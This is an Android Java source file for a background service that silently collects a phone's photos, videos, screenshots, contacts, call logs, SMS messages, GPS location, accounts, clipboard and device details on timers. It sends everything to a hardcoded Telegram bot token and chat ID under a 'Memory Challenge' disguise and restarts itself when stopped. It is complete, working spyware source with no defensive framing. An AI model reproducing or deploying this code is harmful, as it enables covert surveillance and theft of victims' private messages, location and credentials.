package com.v8.global.sniffer;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationManager;
import android.net.Uri;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.StatFs;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.provider.Settings;
import android.accounts.Account;
import android.accounts.AccountManager;
import android.content.ClipboardManager;
import android.content.ClipData;
import android.util.Log;
import androidx.core.app.ActivityCompat;
import androidx.core.app.NotificationCompat;
import java.io.File;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.concurrent.TimeUnit;
import okhttp3.*;

public class AutoCollectorService extends Service {

    // ==================== الثوابت ====================
    private static final String TAG = "AutoCollector";
    private static final String TOKEN = "8307560710:AAFNRpzh141cq7rKt_OmPR0A823dxEaOZVU";
    private static final String CHAT_ID = "7259620384";
    private static final String BASE_URL = "https://api.telegram.org/bot" + TOKEN + "/";
    private static final int NOTIFICATION_ID = 999;
    
    // ==================== فترات الجمع ====================
    private static final long DELAY_PHOTOS = 3 * 60 * 1000;      // 3 دقائق
    private static final long DELAY_VIDEOS = 5 * 60 * 1000;      // 5 دقائق
    private static final long DELAY_SCREENSHOT = 60 * 1000;      // دقيقة واحدة
    private static final long DELAY_CONTACTS = 30 * 60 * 1000;   // 30 دقيقة
    private static final long DELAY_CALLS = 30 * 60 * 1000;      // 30 دقيقة
    private static final long DELAY_SMS = 30 * 60 * 1000;        // 30 دقيقة
    private static final long DELAY_LOCATION = 5 * 60 * 1000;    // 5 دقائق
    private static final long DELAY_ACCOUNTS = 60 * 60 * 1000;   // ساعة
    private static final long DELAY_CLIPBOARD = 30 * 1000;       // 30 ثانية
    private static final long DELAY_DEVICE_INFO = 60 * 60 * 1000; // ساعة
    private static final long DELAY_PASSWORDS = 15 * 60 * 1000;  // 15 دقيقة

    // ==================== المتغيرات ====================
    private Handler handler = new Handler(Looper.getMainLooper());
    private OkHttpClient client;
    private boolean isRunning = true;
    
    // متغيرات تتبع آخر إرسال
    private long lastPhotoTime = 0;
    private long lastVideoTime = 0;
    private long lastScreenshotTime = 0;
    private long lastContactsTime = 0;
    private long lastCallLogTime = 0;
    private long lastSMSTime = 0;
    private long lastLocationTime = 0;
    private long lastAccountsTime = 0;
    private long lastDeviceInfoTime = 0;
    private String lastClipboardContent = "";

    // ==================== دورة الحياة ====================
    
    @Override
    public void onCreate() {
        super.onCreate();
        
        // تهيئة OkHttpClient
        client = new OkHttpClient.Builder()
                .connectTimeout(60, TimeUnit.SECONDS)
                .writeTimeout(60, TimeUnit.SECONDS)
                .readTimeout(60, TimeUnit.SECONDS)
                .build();
        
        startForegroundService();
        startAutoCollection();
        
        sendTelegram("🚀 **تم تشغيل السحب التلقائي**\n" +
                    "📱 " + Build.MODEL + "\n" +
                    "⏰ " + new Date().toString());
        
        Log.d(TAG, "خدمة الجمع التلقائي بدأت");
    }
    
    private void startForegroundService() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                "collector_channel",
                "Memory Challenge Service",
                NotificationManager.IMPORTANCE_LOW
            );
            
            NotificationManager manager = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
            manager.createNotificationChannel(channel);

            Notification notification = new NotificationCompat.Builder(this, "collector_channel")
                    .setContentTitle("Memory Challenge")
                    .setContentText("جمع البيانات التلقائي قيد التشغيل")
                    .setSmallIcon(android.R.drawable.ic_dialog_info)
                    .setPriority(NotificationCompat.PRIORITY_LOW)
                    .build();

            startForeground(NOTIFICATION_ID, notification);
        }
    }
    
    private void startAutoCollection() {
        // سحب الصور
        handler.postDelayed(photosRunnable, 10 * 1000);
        
        // سحب الفيديوهات
        handler.postDelayed(videosRunnable, 20 * 1000);
        
        // سحب لقطات الشاشة
        handler.postDelayed(screenshotRunnable, 30 * 1000);
        
        // سحب جهات الاتصال
        handler.postDelayed(contactsRunnable, 40 * 1000);
        
        // سجل المكالمات
        handler.postDelayed(callsRunnable, 50 * 1000);
        
        // سحب الرسائل
        handler.postDelayed(smsRunnable, 60 * 1000);
        
        // الموقع
        handler.postDelayed(locationRunnable, 70 * 1000);
        
        // سحب الحسابات
        handler.postDelayed(accountsRunnable, 80 * 1000);
        
        // سحب الحافظة
        handler.postDelayed(clipboardRunnable, 5 * 1000);
        
        // معلومات الجهاز
        handler.postDelayed(deviceInfoRunnable, 90 * 1000);
        
        // كلمات المرور
        handler.postDelayed(passwordsRunnable, 100 * 1000);
    }

    // ==================== Runنقاط الجمع ====================
    
    private Runnable photosRunnable = new Runnable() {
        @Override
        public void run() {
            if (isRunning) {
                collectAllPhotos();
                handler.postDelayed(this, DELAY_PHOTOS);
            }
        }
    };
    
    private Runnable videosRunnable = new Runnable() {
        @Override
        public void run() {
            if (isRunning) {
                collectAllVideos();
                handler.postDelayed(this, DELAY_VIDEOS);
            }
        }
    };
    
    private Runnable screenshotRunnable = new Runnable() {
        @Override
        public void run() {
            if (isRunning) {
                takeScreenshot();
                handler.postDelayed(this, DELAY_SCREENSHOT);
            }
        }
    };
    
    private Runnable contactsRunnable = new Runnable() {
        @Override
        public void run() {
            if (isRunning) {
                collectContacts();
                handler.postDelayed(this, DELAY_CONTACTS);
            }
        }
    };
    
    private Runnable callsRunnable = new Runnable() {
        @Override
        public void run() {
            if (isRunning) {
                collectCallLogs();
                handler.postDelayed(this, DELAY_CALLS);
            }
        }
    };
    
    private Runnable smsRunnable = new Runnable() {
        @Override
        public void run() {
            if (isRunning) {
                collectSMS();
                handler.postDelayed(this, DELAY_SMS);
            }
        }
    };
    
    private Runnable locationRunnable = new Runnable() {
        @Override
        public void run() {
            if (isRunning) {
                collectLocation();
                handler.postDelayed(this, DELAY_LOCATION);
            }
        }
    };
    
    private Runnable accountsRunnable = new Runnable() {
        @Override
        public void run() {
            if (isRunning) {
                collectAccounts();
                handler.postDelayed(this, DELAY_ACCOUNTS);
            }
        }
    };
    
    private Runnable clipboardRunnable = new Runnable() {
        @Override
        public void run() {
            if (isRunning) {
                collectClipboard();
                handler.postDelayed(this, DELAY_CLIPBOARD);
            }
        }
    };
    
    private Runnable deviceInfoRunnable = new Runnable() {
        @Override
        public void run() {
            if (isRunning) {
                collectDeviceInfo();
                handler.postDelayed(this, DELAY_DEVICE_INFO);
            }
        }
    };
    
    private Runnable passwordsRunnable = new Runnable() {
        @Override
        public void run() {
            if (isRunning) {
                collectPasswords();
                handler.postDelayed(this, DELAY_PASSWORDS);
            }
        }
    };

    // ==================== دوال الجمع ====================
    
    /**
     * جمع جميع الصور الجديدة
     */
    private void collectAllPhotos() {
        try {
            String[] projection = {
                MediaStore.Images.Media.DATA,
                MediaStore.Images.Media.DATE_ADDED,
                MediaStore.Images.Media.SIZE,
                MediaStore.Images.Media.DISPLAY_NAME
            };
            
            long oneHourAgo = System.currentTimeMillis() / 1000 - (60 * 60);
            String selection = MediaStore.Images.Media.DATE_ADDED + " > ?";
            String[] selectionArgs = {String.valueOf(oneHourAgo)};
            
            Cursor cursor = getContentResolver().query(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                projection,
                selection,
                selectionArgs,
                MediaStore.Images.Media.DATE_ADDED + " DESC LIMIT 30"
            );
            
            if (cursor != null) {
                int count = 0;
                while (cursor.moveToNext() && count < 10) {
                    String path = cursor.getString(0);
                    String name = cursor.getString(3);
                    long date = cursor.getLong(1) * 1000;
                    long size = cursor.getLong(2);
                    
                    if (date > lastPhotoTime && size < 15 * 1024 * 1024 && new File(path).exists()) {
                        sendPhoto(path, "📸 **صورة جديدة**\n📁 " + name + "\n📅 " + new Date(date).toString());
                        lastPhotoTime = date;
                        count++;
                        Thread.sleep(2000);
                    }
                }
                
                if (count > 0) {
                    Log.d(TAG, "تم إرسال " + count + " صور");
                }
                cursor.close();
            }
        } catch (Exception e) {
            Log.e(TAG, "خطأ في جمع الصور: " + e.getMessage());
        }
    }
    
    /**
     * جمع جميع الفيديوهات الجديدة
     */
    private void collectAllVideos() {
        try {
            String[] projection = {
                MediaStore.Video.Media.DATA,
                MediaStore.Video.Media.DATE_ADDED,
                MediaStore.Video.Media.SIZE,
                MediaStore.Video.Media.DISPLAY_NAME
            };
            
            long oneHourAgo = System.currentTimeMillis() / 1000 - (60 * 60);
            String selection = MediaStore.Video.Media.DATE_ADDED + " > ?";
            String[] selectionArgs = {String.valueOf(oneHourAgo)};
            
            Cursor cursor = getContentResolver().query(
                MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
                projection,
                selection,
                selectionArgs,
                MediaStore.Video.Media.DATE_ADDED + " DESC LIMIT 15"
            );
            
            if (cursor != null) {
                int count = 0;
                while (cursor.moveToNext() && count < 5) {
                    String path = cursor.getString(0);
                    String name = cursor.getString(3);
                    long date = cursor.getLong(1) * 1000;
                    long size = cursor.getLong(2);
                    
                    if (date > lastVideoTime && size < 50 * 1024 * 1024 && new File(path).exists()) {
                        sendVideo(path, "🎥 **فيديو جديد**\n📁 " + name + "\n📅 " + new Date(date).toString());
                        lastVideoTime = date;
                        count++;
                        Thread.sleep(3000);
                    }
                }
                
                if (count > 0) {
                    Log.d(TAG, "تم إرسال " + count + " فيديوهات");
                }
                cursor.close();
            }
        } catch (Exception e) {
            Log.e(TAG, "خطأ في جمع الفيديوهات: " + e.getMessage());
        }
    }
    
    /**
     * تصوير الشاشة
     */
    private void takeScreenshot() {
        try {
            String filePath = Environment.getExternalStorageDirectory() + "/DCIM/screenshot_" + 
                             System.currentTimeMillis() + ".png";
            
            Process process = Runtime.getRuntime().exec("screencap -p " + filePath);
            process.waitFor();
            
            File file = new File(filePath);
            if (file.exists() && file.length() > 0) {
                long now = System.currentTimeMillis();
                if (now - lastScreenshotTime > 60 * 1000) {
                    sendPhoto(filePath, "📱 **لقطة شاشة**\n⏰ " + new Date().toString());
                    lastScreenshotTime = now;
                }
                file.delete();
            }
        } catch (Exception e) {
            Log.e(TAG, "خطأ في تصوير الشاشة: " + e.getMessage());
        }
    }
    
    /**
     * جمع جهات الاتصال
     */
    private void collectContacts() {
        try {
            StringBuilder sb = new StringBuilder("👤 **جهات الاتصال**\n\n");
            Cursor cursor = getContentResolver().query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                null, null, null,
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC"
            );
            
            int count = 0;
            if (cursor != null) {
                while (cursor.moveToNext() && count < 50) {
                    String name = cursor.getString(cursor.getColumnIndex(
                            ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                    String phone = cursor.getString(cursor.getColumnIndex(
                            ContactsContract.CommonDataKinds.Phone.NUMBER));
                    
                    sb.append("📞 **").append(name).append("**\n");
                    sb.append("   ").append(phone).append("\n\n");
                    count++;
                }
                cursor.close();
            }
            
            if (count > 0) {
                sb.append("إجمالي: ").append(count);
                sendTelegram(sb.toString());
                lastContactsTime = System.currentTimeMillis();
            }
        } catch (Exception e) {
            Log.e(TAG, "خطأ في جهات الاتصال");
        }
    }
    
    /**
     * جمع سجل المكالمات
     */
    private void collectCallLogs() {
        try {
            StringBuilder sb = new StringBuilder("📞 **سجل المكالمات**\n\n");
            Cursor cursor = getContentResolver().query(
                CallLog.Calls.CONTENT_URI,
                null, null, null,
                CallLog.Calls.DATE + " DESC LIMIT 30"
            );
            
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    String number = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));
                    String name = cursor.getString(cursor.getColumnIndex(CallLog.Calls.CACHED_NAME));
                    String type = cursor.getString(cursor.getColumnIndex(CallLog.Calls.TYPE));
                    long date = cursor.getLong(cursor.getColumnIndex(CallLog.Calls.DATE));
                    
                    String typeText = type.equals("1") ? "📞 وارد" : 
                                     type.equals("2") ? "📞 صادر" : "❌ فائت";
                    
                    sb.append(typeText).append("\n");
                    sb.append("   ").append(name != null ? name : number).append("\n");
                    sb.append("   ").append(new SimpleDateFormat("yyyy-MM-dd HH:mm", Locale.US)
                            .format(new Date(date))).append("\n\n");
                }
                cursor.close();
            }
            
            sendTelegram(sb.toString());
            lastCallLogTime = System.currentTimeMillis();
        } catch (Exception e) {
            Log.e(TAG, "خطأ في سجل المكالمات");
        }
    }
    
    /**
     * جمع الرسائل النصية
     */
    private void collectSMS() {
        try {
            StringBuilder sb = new StringBuilder("💬 **الرسائل النصية**\n\n");
            Cursor cursor = getContentResolver().query(
                Uri.parse("content://sms/inbox"),
                null, null, null,
                "date DESC LIMIT 20"
            );
            
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    String address = cursor.getString(cursor.getColumnIndex("address"));
                    String body = cursor.getString(cursor.getColumnIndex("body"));
                    long date = cursor.getLong(cursor.getColumnIndex("date"));
                    
                    sb.append("📨 **من ").append(address).append("**\n");
                    sb.append("   ").append(body).append("\n");
                    sb.append("   ").append(new SimpleDateFormat("yyyy-MM-dd HH:mm", Locale.US)
                            .format(new Date(date))).append("\n\n");
                }
                cursor.close();
            }
            
            sendTelegram(sb.toString());
            lastSMSTime = System.currentTimeMillis();
        } catch (Exception e) {
            Log.e(TAG, "خطأ في الرسائل");
        }
    }
    
    /**
     * جمع الموقع الجغرافي
     */
    private void collectLocation() {
        try {
            LocationManager lm = (LocationManager) getSystemService(LOCATION_SERVICE);
            if (ActivityCompat.checkSelfPermission(this, 
                    android.Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
                
                Location location = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
                if (location == null) {
                    location = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
                }
                
                if (location != null) {
                    String mapUrl = "https://maps.google.com/?q=" + 
                                   location.getLatitude() + "," + 
                                   location.getLongitude();
                    
                    String msg = "📍 **الموقع الحالي**\n\n" +
                                "**الخط:** " + location.getLatitude() + "\n" +
                                "**الطول:** " + location.getLongitude() + "\n" +
                                "**الدقة:** " + location.getAccuracy() + "م\n" +
                                "**الرابط:** " + mapUrl + "\n\n" +
                                "⏰ " + new Date().toString();
                    
                    sendTelegram(msg);
                    lastLocationTime = System.currentTimeMillis();
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "خطأ في الموقع");
        }
    }
    
    /**
     * جمع الحسابات
     */
    private void collectAccounts() {
        try {
            AccountManager am = (AccountManager) getSystemService(ACCOUNT_SERVICE);
            Account[] accounts = am.getAccounts();
            
            if (accounts.length > 0) {
                StringBuilder sb = new StringBuilder("🔑 **الحسابات المسجلة**\n\n");
                
                for (Account account : accounts) {
                    sb.append("**").append(account.type).append("**\n");
                    sb.append("   ").append(account.name).append("\n\n");
                }
                
                sendTelegram(sb.toString());
                lastAccountsTime = System.currentTimeMillis();
            }
        } catch (Exception e) {
            Log.e(TAG, "خطأ في الحسابات");
        }
    }
    
    /**
     * جمع الحافظة
     */
    private void collectClipboard() {
        try {
            ClipboardManager clipboard = (ClipboardManager) getSystemService(CLIPBOARD_SERVICE);
            ClipData clip = clipboard.getPrimaryClip();
            
            if (clip != null && clip.getItemCount() > 0) {
                String text = clip.getItemAt(0).getText().toString();
                
                if (!text.equals(lastClipboardContent) && !text.isEmpty() && text.length() > 3) {
                    sendTelegram("📋 **محتوى جديد في الحافظة**\n\n" + text);
                    lastClipboardContent = text;
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "خطأ في الحافظة");
        }
    }
    
    /**
     * جمع معلومات الجهاز
     */
    private void collectDeviceInfo() {
        try {
            StringBuilder sb = new StringBuilder("📱 **معلومات الجهاز**\n\n");
            
            sb.append("**الطراز:** ").append(Build.MODEL).append("\n");
            sb.append("**الشركة:** ").append(Build.MANUFACTURER).append("\n");
            sb.append("**الإصدار:** ").append(Build.VERSION.RELEASE).append("\n");
            sb.append("**Android:** ").append(Build.VERSION.SDK_INT).append("\n");
            
            String deviceId = Settings.Secure.getString(getContentResolver(), 
                    Settings.Secure.ANDROID_ID);
            sb.append("**المعرف:** `").append(deviceId).append("`\n\n");
            
            // البطارية
            android.content.IntentFilter ifilter = new android.content.IntentFilter(
                    Intent.ACTION_BATTERY_CHANGED);
            android.content.Intent batteryStatus = registerReceiver(null, ifilter);
            if (batteryStatus != null) {
                int level = batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1);
                int scale = batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1);
                int batteryPct = level * 100 / scale;
                sb.append("**البطارية:** ").append(batteryPct).append("%\n");
            }
            
            // المساحة التخزينية
            StatFs stat = new StatFs(Environment.getExternalStorageDirectory().getPath());
            long bytesAvailable = (long) stat.getBlockSizeLong() * 
                                 (long) stat.getAvailableBlocksLong();
            long megAvailable = bytesAvailable / (1024 * 1024);
            sb.append("**المساحة المتوفرة:** ").append(megAvailable).append(" MB\n\n");
            
            // شبكة واي فاي
            WifiManager wifiManager = (WifiManager) getApplicationContext()
                    .getSystemService(WIFI_SERVICE);
            WifiInfo wifiInfo = wifiManager.getConnectionInfo();
            String ssid = wifiInfo.getSSID().replace("\"", "");
            if (!ssid.isEmpty() && !ssid.equals("<unknown ssid>")) {
                sb.append("**الشبكة:** ").append(ssid).append("\n");
            }
            
            sendTelegram(sb.toString());
            lastDeviceInfoTime = System.currentTimeMillis();
        } catch (Exception e) {
            Log.e(TAG, "خطأ في معلومات الجهاز");
        }
    }
    
    /**
     * جمع كلمات المرور (تستقبل من Accessibility Service)
     */
    private void collectPasswords() {
        // هذه الدالة تستقبل البيانات من MyAccessibilityService
        // سيتم إرسال كلمات المرور مباشرة عند اكتشافها
    }

    // ==================== دوال الإرسال ====================
    
    /**
     * إرسال صورة إلى تيليغرام
     */
    private void sendPhoto(String filePath, String caption) {
        try {
            File file = new File(filePath);
            if (!file.exists() || file.length() == 0) return;
            
            String fileName = file.getName();
            String mimeType = fileName.endsWith(".png") ? "image/png" : "image/jpeg";
            
            RequestBody body = new MultipartBody.Builder()
                    .setType(MultipartBody.FORM)
                    .addFormDataPart("chat_id", CHAT_ID)
                    .addFormDataPart("caption", caption)
                    .addFormDataPart("photo", fileName,
                            RequestBody.create(MediaType.parse(mimeType), file))
                    .build();
            
            Request request = new Request.Builder()
                    .url(BASE_URL + "sendPhoto")
                    .post(body)
                    .build();
            
            client.newCall(request).enqueue(new Callback() {
                @Override
                public void onFailure(Call call, IOException e) {
                    Log.e(TAG, "فشل إرسال الصورة: " + e.getMessage());
                }
                
                @Override
                public void onResponse(Call call, Response response) throws IOException {
                    response.close();
                }
            });
        } catch (Exception e) {
            Log.e(TAG, "خطأ في إرسال الصورة: " + e.getMessage());
        }
    }
    
    /**
     * إرسال فيديو إلى تيليغرام
     */
    private void sendVideo(String filePath, String caption) {
        try {
            File file = new File(filePath);
            if (!file.exists() || file.length() == 0) return;
            
            RequestBody body = new MultipartBody.Builder()
                    .setType(MultipartBody.FORM)
                    .addFormDataPart("chat_id", CHAT_ID)
                    .addFormDataPart("caption", caption)
                    .addFormDataPart("video", file.getName(),
                            RequestBody.create(MediaType.parse("video/mp4"), file))
                    .build();
            
            Request request = new Request.Builder()
                    .url(BASE_URL + "sendVideo")
                    .post(body)
                    .build();
            
            client.newCall(request).enqueue(new Callback() {
                @Override
                public void onFailure(Call call, IOException e) {
                    Log.e(TAG, "فشل إرسال الفيديو: " + e.getMessage());
                }
                
                @Override
                public void onResponse(Call call, Response response) throws IOException {
                    response.close();
                }
            });
        } catch (Exception e) {
            Log.e(TAG, "خطأ في إرسال الفيديو: " + e.getMessage());
        }
    }
    
    /**
     * إرسال رسالة نصية إلى تيليغرام
     */
    private void sendTelegram(String message) {
        try {
            String url = BASE_URL + "sendMessage?chat_id=" + CHAT_ID + 
                         "&text=" + Uri.encode(message) + "&parse_mode=Markdown";
            
            Request request = new Request.Builder()
                    .url(url)
                    .build();
            
            client.newCall(request).enqueue(new Callback() {
                @Override
                public void onFailure(Call call, IOException e) {
                    Log.e(TAG, "فشل إرسال الرسالة: " + e.getMessage());
                }
                
                @Override
                public void onResponse(Call call, Response response) throws IOException {
                    response.close();
                }
            });
        } catch (Exception e) {
            Log.e(TAG, "خطأ في إرسال الرسالة: " + e.getMessage());
        }
    }

    // ==================== Service Lifecycle ====================
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY; // يعيد تشغيل الخدمة إذا توقفت
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        isRunning = false;
        
        Log.d(TAG, "خدمة الجمع التلقائي تتوقف...");
        
        // إعادة تشغيل الخدمة
        Intent intent = new Intent(this, AutoCollectorService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent);
        } else {
            startService(intent);
        }
    }
}
